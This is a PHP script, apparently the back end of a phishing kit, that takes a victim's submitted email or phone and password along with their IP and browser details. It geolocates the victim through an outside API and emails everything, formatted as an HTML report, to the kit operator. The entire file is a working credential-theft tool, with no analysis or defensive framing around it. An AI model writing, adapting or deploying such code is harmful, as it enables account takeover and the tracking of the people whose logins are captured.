<?php
include 'email.php';
date_default_timezone_set("Asia/Jakarta");
// INIT CONFIG


function devicemanager($ua){
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, "https://api-xyz.com/system/useragent/?ua=".urlencode($ua)); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
    $exe = curl_exec($ch); 
    curl_close($ch);      

    return json_decode($exe,true);
}

function location($var){
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, "https://api-xyz.com/system/flag/?ip=".$var); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
    $exe = curl_exec($ch); 
    curl_close($ch);      

    return json_decode($exe,true);
}


$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_POST['ip'];
$ua = $_POST['ua'];
$time = date('d-m-Y : h-i-s');
// FLAG
$info = location($ip);
$dev = devicemanager($ua);

$subjek = $info['flag'].' '.$info['code'].' | PUNYA '.$user;
$pesan = '
<center>
 <div style="background: url(https://i.ibb.co/j53Pkb9/Imgku.jpg) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #996633; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Phone</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>

</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: #996633; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
ADDITIONAL INFORMATION
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Ip Address</th>
<th style="width: 65%; text-align: center;"><b>'.$ip.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Country</th>
<th style="width: 65%; text-align: center;"><b>'.$info['country'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Flag</th>
<th style="width: 65%; text-align: center;"><b>'.$info['flag'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Region</th>
<th style="width: 65%; text-align: center;"><b>'.$info['region'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>City</th>
<th style="width: 65%; text-align: center;"><b>'.$info['city'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Zip</th>
<th style="width: 65%; text-align: center;"><b>'.$info['zip'].'</th> 
</tr>
</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: #996633; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
DEVICE INFORMATION
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Device</th>
<th style="width: 65%; text-align: center;"><b>'.$dev['device'].'</th> 
</tr>
<tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Browser</th>
<th style="width: 65%; text-align: center;"><b>'.$dev['browser'].'</th> 
</tr>
<tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Os</th>
<th style="width: 65%; text-align: center;"><b>'.$dev['os'].'</th> 
</tr>
<tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date/Time</th>
<th style="width: 65%; text-align: center;"><b>'.$time.'</th> 
</tr>
<tr>
</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: #996633; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3399ff;" href="https://www.facebook.com/nextnesia">Facebook</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#00ff00;" href="https://wa.me/6281332412122">Whatsapp</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#ff0000;" href="https://www.youtube.com/wahyuekaprayogayt">Youtube</a>
</div>
 <center>
';

$sender = 'From: Nextnesia - GroupWA <nextnesiahost@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
// MENGIRIM DATA KE EMAIL
mail($email, $subjek, $pesan, $headers);
?>